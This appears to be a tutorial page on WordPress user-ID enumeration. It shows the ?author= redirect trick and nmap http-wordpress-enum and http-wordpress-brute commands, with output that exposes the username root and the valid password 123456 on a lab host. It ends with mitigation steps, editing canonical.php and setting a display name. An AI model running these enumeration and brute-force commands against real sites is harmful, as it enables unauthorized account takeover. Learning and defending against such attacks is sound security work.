ID hacking
==============

To see which ID is in the WordPress website, 
open the following URL but change the IP address with your own address or name: ::

    http:://172.17.0.7/?author=1

If you have not deleted the default admin ID created during the installation,
you will be redirected to the URL similar to this: ::

    http://172.17.0.7/authors/admin

This means that admin user of the system is ``admin``.
I do not know why WordPress provide this functionality.

You can enumerate the users list taking advantage of this weakness.
Tools such as wpscan, nmap and Burp Suite are available to do this [`attacking-wordpress <https://hackertarget.com/attacking-wordpress/>`_].
Here I will show you how to use nmap script for this attack.

Attack with nmap
-------------------

The command ``nmap -sV --script http-wordpress-enum --script-args limit=25 <target>`` 
shows user names as well as the open ports and its service/version info.
Default limit is 100. If you specify ``limit`` argument as 25, only 25 user IDs is searched.

::

    $ nmap -sV --script http-wordpress-enum --script-args limit=25 172.17.0.7

    Starting Nmap 6.40 ( http://nmap.org ) at 2015-06-01 15:57 AEST
    Nmap scan report for 172.17.0.7
    Host is up (0.00035s latency).
    Not shown: 998 closed ports
    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
    | http-wordpress-enum: 
    | Username found: root
    |_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-enum.limit'
    3306/tcp open  mysql   MySQL (unauthorized)

    Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
    
Moreover, brute force attack can be excuted to find the password of certain user or users.
The file of ``500-worst-passwords.txt`` used below is from `Skull Security <https://wiki.skullsecurity.org/Passwords>`_.
``users.txt`` just contains ``root`` and ``admin`` and you can add more from the result of user enumeration described above.

::

    $ nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=500-worst-passwords.txt' 172.17.0.7 

    Starting Nmap 6.40 ( http://nmap.org ) at 2015-06-01 16:37 AEST
    Nmap scan report for 172.17.0.7
    Host is up (0.00040s latency).
    Not shown: 998 closed ports
    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
    | http-wordpress-brute: 
    |   Accounts
    |     root:123456
    |     root:123456 - Valid credentials
    |   Statistics
    |_    Performed 506 guesses in 5 seconds, average tps: 101
    3306/tcp open  mysql   MySQL (unauthorized)

    Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds

How to secure your WordPress ID from theft
----------------------------------------------

There are several ways to protect your ID:

- modify WordPress source code
- URL change with modwrite
- WordPress plugin

You can find a document in detail for this in 
`Question Defense <http://www.question-defense.com/2012/03/20/block-wordpress-user-enumeration-secure-wordpress-against-hacking>`_.

Here I just introduce the way of modifying the WordPress source code.
The file you must change is ``wp-includes/canonical.php``. Search for ``author`` and delete four lines similar to these ones: ::

        if ( ( false !== $author ) && $wpdb->get_var( $wpdb->prepare( "SELECT ID FROM $wpdb->posts WHERE $wpdb->posts.post_author = %d AND $wpdb->posts.post_status = 'publish' LIMIT 1", $author->ID ) ) ) {
            if ( $redirect_url = get_author_posts_url($author->ID, $author->user_nicename) )
                $redirect['query'] = remove_query_arg('author', $redirect['query']);
        }

.. note:: Even though you disabled the feature of ID exposure in the URL line of web browser, 
    the web page of ending with ``?author=1`` will show your ID in web page
    if you don't set up ``Display name`` in your profile. So you must configure it different with ID like this:

        .. image:: wp-id.png 



